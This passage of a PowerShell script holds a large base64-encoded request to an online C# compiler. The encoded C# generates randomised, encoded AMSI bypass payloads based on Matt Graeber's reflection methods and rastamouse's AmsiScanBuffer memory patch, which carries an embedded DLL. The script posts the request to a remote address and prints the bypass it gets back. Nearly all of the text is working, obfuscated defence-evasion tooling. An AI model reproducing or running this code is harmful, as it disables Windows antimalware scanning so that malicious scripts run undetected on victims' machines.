JiN4Mjc7U3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzJiN4Mjc7KSkuRnVsbE5hbWUpLCBTeXN0ZW0uUmVmbGVjdGlvbi5GaWVsZEluZm9dXFwmcXVvdDsgLWFzIFtTdHJpbmddLkFzc2VtYmx5LkdldFR5cGUoJiN4Mjc7U3lzdGVtLlR5cGUmI3gyNzspKSwgW09iamVjdF0oW1JlZl0uQXNzZW1ibHkuR2V0VHlwZShcXCZxdW90O1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uQW1zaVV0aWxzXFwmcXVvdDspKSwoJiN4Mjc7R2V0RmllbGQmI3gyNzspKS5JbnZva2UoJiN4Mjc7YW1zaUluaXRGYWlsZWQmI3gyNzssKChcXCZxdW90O05vblB1YmxpYyxTdGF0aWNcXCZxdW90OykgLWFzIFtTdHJpbmddLkFzc2VtYmx5LkdldFR5cGUoJiN4Mjc7U3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzJiN4Mjc7KSkpLlNldFZhbHVlKCRudWxsLCRUcnVlKTsmcXVvdDs7XG5cbiAgICAgICAgLy9Vc2luZyBNYXR0IEdyYWViZXJzIHNlY29uZCBSZWZsZWN0aW9uIG1ldGhvZFxuICAgICAgICB2YXIgTWF0dEdyZWYwMiA9ICZxdW90O1tSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6KFxcJnF1b3Q7V3JpdGVJbnQzMlxcJnF1b3Q7KShbUmVmXS5Bc3NlbWJseS5HZXRUeXBlKFxcJnF1b3Q7U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHNcXCZxdW90OykuR2V0RmllbGQoXFwmcXVvdDthbXNpQ29udGV4dFxcJnF1b3Q7LFtSZWZsZWN0aW9uLkJpbmRpbmdGbGFnc11cXCZxdW90O05vblB1YmxpYyxTdGF0aWNcXCZxdW90OykuR2V0VmFsdWUoJG51bGwpLDB4JnF1b3Q7ICsgcmFuZG9tLk5leHQoMCwgaW50Lk1heFZhbHVlKS5Ub1N0cmluZygmcXVvdDtYJnF1b3Q7KSArICZxdW90Oyk7JnF1b3Q7O1xuXG4gICAgICAgIC8vVXNpbmcgcmFzdGEtbW91c2VzIEFtc2lTY2FuQnVmZmVyQnlwYXNzIGZyb20gaHR0cHM6Ly9naXRodWIuY29tL3Jhc3RhLW1vdXNlL0Ftc2lTY2FuQnVmZmVyQnlwYXNzL2Jsb2IvbWFzdGVyL0FTQkJ5cGFzcy5wczFcbiAgICAgICAgdmFyIFJhc3RhQnVmID0gRW5jb2RpbmcuVVRGOC5HZXRTdHJpbmcoQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKCZxdW90O0pFeHZZV1JNYVdKeVlYSjVJRDBnVzFONWMzUmxiUzVVWlhoMExrVnVZMjlrYVc1blhUbzZWVlJHT0M1SFpYUlRkSEpwYm1jb1cxTjVjM1JsYlM1RGIyNTJaWEowWFRvNlJuSnZiVUpoYzJVMk5GTjBjbWx1WnlnaVZFYzVhRnBGZUhCWmJrcG9ZMjVyUFNJcEtUc0tKRWRsZEZCeWIyTkJaR1J5WlhOeklEMGdXMU41YzNSbGJTNVVaWGgwTGtWdVkyOWthVzVuWFRvNlZWUkdPQzVIWlhSVGRISnBibWNvVzFONWMzUmxiUzVEYjI1MlpYSjBYVG82Um5KdmJVSmhjMlUyTkZOMGNtbHVaeWdpVWpKV01GVklTblpaTUVacldraEtiR016VFQwaUtTazdDaVJXYVhKMGRXRnNVSEp2ZEdWamRDQTlJRnRUZVhOMFpXMHVWR1Y0ZEM1RmJtTnZaR2x1WjEwNk9sVlVSamd1UjJWMFUzUnlhVzVuS0Z0VGVYTjBaVzB1UTI5dWRtVnlkRjA2T2taeWIyMUNZWE5sTmpSVGRISnBibWNvSWxadGJIbGtTRlpvWWtaQ2VXSXpVbXhaTTFFOUlpa3BPd29rUVZOQ1FrRlFTU0E5SUNKVVZuRlJRVUZOUVVGQlFVVkJRVUZCTHk4NFFVRk1aMEZCUVVGQlFVRkJRVkZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVdkQlFVRkJRVFJtZFdjMFFYUkJiazVKWW1kQ1ZFMHdhRlpIYUhCamVVSjNZMjA1Ym1OdFJuUkpSMDVvWW0wMWRtUkRRbWxhVTBKNVpGYzBaMkZYTkdkU1JUbFVTVWN4ZGxwSFZYVkVVVEJMU2tGQlFVRkJRVUZCUVVKUlVsRkJRVlJCUlVSQlN6aFVaMGRCUVVGQlFVRkJRVUZCUVU5QlFVRnBSVXhCVVhOQlFVRlpRVUZCUVVkQlFVRkJRVUZCUVVocFVVRkJRVUZuUVVGQlFWRkJRVUZCUVVGQlJVRkJaMEZCUVVGQlowRkJRa0ZCUVVGQlFVRkJRVUZGUVVGQlFVRkJRVUZCUVVOQlFVRkJRVUZuUVVGQlFVRkJRVUZOUVZGSlZVRkJRa0ZCUVVKQlFVRkJRVUZGUVVGQlJVRkJRVUZCUVVGQlFrRkJRVUZCUVVGQlFVRkJRVUZCUVUxUmFrRkJRbGhCUVVGQlFVVkJRVUZMUVVOQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUjBGQlFVRjNRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlNVRkJRVU5CUVVGQlFVRkJRVUZCUVVGQlFVRkRRMEZCUVVWblFVRkJRVUZCUVVGQlFVRkJRVUZETlRCYVdHZ3dRVUZCUVVwQlVVRkJRVUZuUVVGQlFVSm5RVUZCUVVsQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGRFFVRkJSMEYxWTI1T2VWbDNRVUZCUzBGRFFVRkJRVkZCUVVGQlFWRkJRVUZCU1VGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVKQlFVRkNRVXh1U214aVJ6bHFRVUZCVFVGQlFVRkJSMEZCUVVGQlEwRkJRVUZFUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVZGQlFVRlJaMEZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGS1FVRkJRVUZCUVVGRlowRkJRVUZEUVVGVlFWVkRRVUZCU0ZGRVFVRkJRa0ZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZGU2xSVGEwbENRVUZGUVVGQlFVRkJRWGRCUVVGQ01rNUROSGRNYWsxM1RYcEZOVUZCUVVGQlFWVkJZa0ZCUVVGRlowSkJRVUZxWm1kQlFYUkJSVUZCUmxGQ1FVRkJhbFV6VW5saFZ6VnVZM2RCUVVGQlFVbEJkMEZCUTBGQlFVRkRUbFpWZDBGUlFYZEJRVVZCUVVGQlEwNUlWbFZzUlVGQlFVRkpRVTFCUVVaUlFVRkJRV3BSYlhoMldXZEJRVUZCUVVGQlFVRkRRVUZCUWxKNFZVRkdRV3RCUVVGQlFTdHBWWHBCUWxsQlFVRkZRVUZCUVVaQlFVRkJRV2RCUVVGQlRVRkJRVUZJUVVGQlFVSkJRVUZCUVVsQlFVRkJRa0ZCUVVGQmQwRkJRVUZGUVVGQlFVSkJRVUZCUVVGQlMwRkJSVUZCUVVGQlFVRlpRVXhuUVc1QlFWbEJkMUZEYVVGQldVRTVRVVJWUVVGWlFVWkJTRlZCUVZsQlRXZEhhVUZCUVVGQlFVRkNRVUZCUVVGQlFVSkJRVVZCWjFGRlVVRkNXVUZCUVVGR1FVRkZRVUZSUVVGQlFVRkJaMEZEVjBsRVZVRkRaMEZDUVVGQlFVRkJRMEZCU2xsblVrRkJVVUZCVFVGQlFVRkJRVWxCUVd4cFFsRkJRbFZCUWtGQlFVRkJSVUZZZDBGQlFVRkpRVnAzUVVGQlFVVkJZMEZCUVVGQlJVRmtVVUZCUVVGSlFXWjNRVUZCUVUxQmFHZEJRMEZCVVVGcmQwRlNRVTAwUVVoblFWcEJUVFJCU1dkQmFFRk5ORUZJWjBGd1FVMDBRVXAzUVhWQlFrMUJURUZCZFVGQ2MwRk9VVUpHUVZGQlFrRjNRVEZCUVVWQlFVRkZSa0ZGVVVGQlVVRkJRVkZqUVZWQlFVSkJRVk5CUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFsbEJRVUZCUlVGQlFVRkJRVUZCUVVGQlFVRkJRVUpCUWpSQlFVRkJRVUZCUVVGQlFVRkJVRVV4ZGxwSVZuTmFWRFJCVVZaT1ExRnJSbEZUVXpWcllrZDNRVkZXVGtOUmEwWlJVMUZDZEdNeVRuWmpiWGh3V1dkQ1ZHVllUakJhVnpCQlZESktjVnBYVGpCQlJXUnNaRVpDZVdJeVRrSmFSMUo1V2xoT2VrRkZlSFpaVjFKTllWZEtlVmxZU2pWQlJscHdZMjVTTVZsWGVGRmpiVGt3V2xkT01FRkhhRTVpTWxJeFlrZFZRV05JU25aWk1EVm9ZbGRWUVdKdFJuUmFVVUp6WTBWR2ExcElTbXhqTTAxQldraGtWR0ZZY0d4QlIxcHpWRzFXTTFWSVNuWmtSMVpxWkVGQ2MyTkhXbk5VTW5oclZVaEtkbVJIVm1wa1FVSlVaVmhPTUZwWE1IVlZibFoxWkVkc2RGcFROVXBpYmxKc1kyMDVkMVV5Vm5sa2JXeHFXbGhOUVZRelZqQlJXRkl3WTIxc2FXUllVbXhCUXpWcVpFYzVlVUZHVGpWak0xSnNZbE0xVTJSWE5UQmhWekZzVEd0T2RtSllRbkJpUjFaNVZUSldlV1J0YkdwYVdFMUJVVEk1ZEdOSGJITlpXRkp3WWpJMVUxcFhlR2hsUjBZd1lWYzVkV013UmpCa1NFcHdXVzVXTUZwUlFsTmtWelV3WVZjeGJGRXlPWFJqUjBZd1lWZEtjR0pIYkRCbFZVWXdaRWhLY0ZsdVZqQmFVVUpGWWtkNFNtSllRblpqYmxKQ1pFaFNlV0ZYU2pGa1IxVkJZVEpXZVdKdFZuTk5la2wxV2tkNGMwRkJRVUZCUVUxblFVRkJRVUZCUTJkNlkzQlJPWEZsV0ZKYVJFZDNRbWRtUlVoUk9VRkJhVE5sYkhoWFIxUlVaMmxSVlVGQmFHZFpSR2RSUVVGU1owOURRVUZGUVdobldrTlNRVXBCZVVGQlFWRlJaMEZSUlVsQ1EwRkNRVkUwU1VGUlFVbEJRVUZCUVVGQlpVRlJRVUpCUmxGRFJteGtlVmxZUWs5aU1qVkdaVWRPYkdOSVVuQmlNalZWWVVoS2RtUXpUVUkzUTAxQlFVRkJRVUZCUVVGQlFVRkJSR2xSUVVGQlFXZEJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCYTBGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUW1aUk1qbDVVa2Q0YzFSWFJuQmlaMEowWXpKT2RtTnRWbXhNYlZKellrRkJRVUZCUVVFdmVWVkJTVUZCVVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVVZCUlVGQlFVRkNaMEZCU1VGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlJVRkJVVUZCUVVSQlFVRkpRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZGUVVGQlFVRkJSV2RCUVVGQ1dWRkJRVUZTUVVsQlFVRkJRVUZCUVVGQlFVRkJVa0ZKTUVGQlFVRldaMEpVUVVZNFFWWm5Ra1pCUmtsQlZYZENTa0ZGT0VGVVowSm1RVVZyUVZSblFrZEJSVGhCUVVGQlFVRk1NRVUzTHpSQlFVRkZRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVRNFFVRkJRVUZCUVVGQlFrRkJRVUZCU1VGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQ1JVRkJRVUZCVVVKWFFVZEZRV05uUWtkQlIydEJZa0ZDYkVGRmEwRmlaMEp0UVVjNFFVRkJRVUZCUTFGQlFrRkJRVUZHVVVGalowSm9RVWMwUVdOM1FuTkJSMFZCWkVGQ2NFRkhPRUZpWjBGQlFVRkJRVUZCUTNkQ1MxRkNRVUZCUWtGR1RVRmtRVUo1UVVkclFXSm5RbTVCUlZsQllWRkNjMEZIVlVGVFVVSjFRVWRaUVdKM1FVRkJTVUZDUVVGQlFrRkVRVUZOUVVGM1FVUkJRVTFCUVRCQlIwbEJUVUZCUVVGRGQwRkJaMEZDUVVWWlFXRlJRbk5CUjFWQlVrRkNiRUZJVFVGWmQwSjVRVWRyUVdOQlFqQkJSMnRCWW5kQ2RVRkJRVUZCUVVGblFVRkJRVTFCUVVsQlFVVkJVbWRDY0VGSGQwRmFVVUpYUVVkVlFXTm5RbnBCUjJ0QlluZENkVUZCUVVGQlFVRjNRVU0wUVUxQlFYVkJSRUZCVEdkQmQwRkJRVUZQUVVGTlFVRkZRVk5SUW5WQlNGRkJXbEZDZVVGSE5FRlpVVUp6UVVVMFFWbFJRblJCUjFWQlFVRkNRa0ZHVFVGUlowSkRRVVZGUVZWQlFrcEJRelJCV2tGQ2MwRkhkMEZCUVVGdlFVRkpRVUZSUWsxQlIxVkJXbmRDYUVGSGQwRlJkMEoyUVVoQlFXVlJRbmxCUjJ0QlduZENiMEZJVVVGQlFVRm5RVUZCUVZGQlFVMUJRVVZCVkhkQ2VVRkhhMEZhZDBKd1FVYzBRVmxSUW5OQlJWbEJZVkZDYzBGSFZVRmlaMEpvUVVjd1FWcFJRVUZCUlVWQlZYZENRMEZGU1VGUlVVSlJRVVZyUVV4blFtdEJSM2RCWWtGQlFVRkVVVUZEUVVGQ1FVWkJRV05uUW5aQlIxRkJaRkZDYWtGSVVVRldaMEpzUVVoSlFXTjNRbkJCUnpoQlltZEJRVUZFUVVGTVowRjNRVU0wUVUxQlFYVkJSRUZCUVVGQk5FRkJaMEZCVVVKQ1FVaE5RV04zUW14QlJ6QkJXV2RDYzBGSWEwRkpRVUpYUVVkVlFXTm5RbnBCUjJ0QlluZENkVUZCUVVGTlFVRjFRVVJCUVV4blFYZEJRelJCVFVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVTkJRVUZCZDBGQlFVRm5Ua0ZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVFOUlqc0tXMUpsWm14bFkzUnBiMjR1UVhOelpXMWliSGxkT2pwTWIyRmtLRnREYjI1MlpYSjBYVG82Um5KdmJVSmhjMlUyTkZOMGNtbHVaeWdrUVZOQ1FrRlFTU2twT3dva1EyRnNiRUZUUWtKQlVFa2dQU0FtSUNoYmMyTnlhWEIwWW14dlkydGRPanBEY21WaGRHVW9XMU41YzNSbGJTNVVaWGgwTGtWdVkyOWthVzVuWFRvNlZWUkdPQzVIWlhSVGRISnBibWNvVzFONWMzUmxiUzVEYjI1MlpYSjBYVG82Um5KdmJVSmhjMlUyTkZOMGNtbHVaeWdpVnpCR1ZGRnJTa0pWUld4a0lpa3BLU2s3Q2lSTWFXSk1iMkZrSUQwZ0pFTmhiR3hCVTBKQ1FWQkpPam9rVEc5aFpFeHBZbkpoY25rb0ltRnRjMmt1Wkd4c0lpazdDaVJOWlcxQlpISWdQU0FrUTJGc2JFRlRRa0pCVUVrNk9pUkhaWFJRY205alFXUmtjbVZ6Y3lna1RHbGlURzloWkN3Z0lrRnRjMmxUWTJGdVFuVm1abVZ5SWlrN0NpUndJRDBnTURzS0pFTmhiR3hCVTBKQ1FWQkpPam9rVm1seWRIVmhiRkJ5YjNSbFkzUW9KRTFsYlVGa2Npd2dXM1ZwYm5Rek1sMDFMQ0F3ZURRd0xDQmJjbVZtWFNSd0tUc0tKSFpoY2pFZ1BTQWlNSGhDT0NJN0NpUjJZWEl5SUQwZ0lqQjROVGNpT3dva2RtRnlNeUE5SUNJd2VEQXdJanNLSkhaaGNqUWdQU0FpTUhnd055STdDaVIyWVhJMUlEMGdJakI0T0RBaU93b2tkbUZ5TmlBOUlDSXdlRU16SWpzS0pGQmhkR05vSUQwZ1cwSjVkR1ZiWFYwZ0tDUjJZWEl4TENSMllYSXlMQ1IyWVhJekxDUjJZWEkwTENza2RtRnlOU3dySkhaaGNqWXBPd3BiVTNsemRHVnRMbEoxYm5ScGJXVXVTVzUwWlhKdmNGTmxjblpwWTJWekxrMWhjbk5vWVd4ZE9qcERiM0I1S0NSUVlYUmphQ3dnTUN3Z0pFMWxiVUZrY2l3Z05pazcmcXVvdDspKTtcblxuICAgICAgICAvL1NlbGVjdCBhIHJhbmRvbSBtZXRob2RcbiAgICAgICAgc3dpdGNoIChSYW5kb21OdW1iZXIoMSwgNikpXG4gICAgICAgIHtcbiAgICAgICAgICAgIGNhc2UgMTpcbiAgICAgICAgICAgICAgICByZXR1cm4gZW5jb2RlUGF5bG9hZChNYXR0R1JlZmwpO1xuICAgICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICAgICAgIHJldHVybiBlbmNvZGVQYXlsb2FkKE1hdHRHUmVmbExvZyk7XG4gICAgICAgICAgICBjYXNlIDM6XG4gICAgICAgICAgICAgICAgcmV0dXJuIGVuY29kZVBheWxvYWQoTWF0dEdyZWYwMik7XG4gICAgICAgICAgICBjYXNlIDQ6XG4gICAgICAgICAgICAgICAgcmV0dXJuIGVuY29kZVBheWxvYWQoRm9yY2VFcnJlciwgdHJ1ZSk7XG4gICAgICAgICAgICBjYXNlIDU6XG4gICAgICAgICAgICAgICAgcmV0dXJuIGVuY29kZXJhc3RhKFJhc3RhQnVmKTtcbiAgICAgICAgICAgIGRlZmF1bHQ6XG4gICAgICAgICAgICAgICAgcmV0dXJuIGVuY29kZVBheWxvYWQoTWF0dEdSZWZsKTtcbiAgICAgICAgfVxuICAgIH1cbiAgICBwdWJsaWMgc3RhdGljIHZvaWQgTWFpbigpIHsgXG4gICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKEdlbmVyYXRlKCkpO1xuICAgIH1cblxufVxuIiwiT3JpZ2luYWxDb2RlQmxvY2siOiJ1c2luZyBTeXN0ZW07XG5cdFx0XHRcdFx0XG5wdWJsaWMgY2xhc3MgUHJvZ3JhbVxue1xuXHRwdWJsaWMgc3RhdGljIHZvaWQgTWFpbigpXG5cdHtcblx0XHRDb25zb2xlLldyaXRlTGluZShcIkhlbGxvIFdvcmxkXCIpO1xuXHR9XG59IiwiTGFuZ3VhZ2UiOiJDU2hhcnAiLCJDb21waWxlciI6Ik5ldENvcmUyMiIsIlByb2plY3RUeXBlIjoiQ29uc29sZSIsIk9yaWdpbmFsRmlkZGxlSWQiOiJDc0NvbnNDb3JlIiwiTnVHZXRQYWNrYWdlVmVyc2lvbklkcyI6IiIsIk9yaWdpbmFsTnVHZXRQYWNrYWdlVmVyc2lvbklkcyI6IiIsIlRpbWVPZmZzZXQiOiI3IiwiQ29uc29sZUlucHV0TGluZXMiOltdLCJNdmNWaWV3RW5naW5lIjoiUmF6b3IiLCJNdmNDb2RlQmxvY2siOnsiTW9kZWwiOiIiLCJWaWV3IjoiIiwiQ29udHJvbGxlciI6IiJ9LCJPcmlnaW5hbE12Y0NvZGVCbG9jayI6eyJNb2RlbCI6IiIsIlZpZXciOiIiLCJDb250cm9sbGVyIjoiIn0sIlVzZVJlc3VsdENhY2hlIjpmYWxzZX0="
$jsonpostrequest = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$jsonpostrequestbase64"))
$sendrequest = Invoke-WebRequest -Uri $destinationaddr -Method POST -Body $jsonpostrequest -ContentType "application/json"
$parsedoutput = ((($sendrequest.Content | ConvertFrom-Json | Select ConsoleOutput) -replace "@{ConsoleOutput=", "") -replace '\r?\n[^\n]*\Z')
Write-Host $parsedoutput
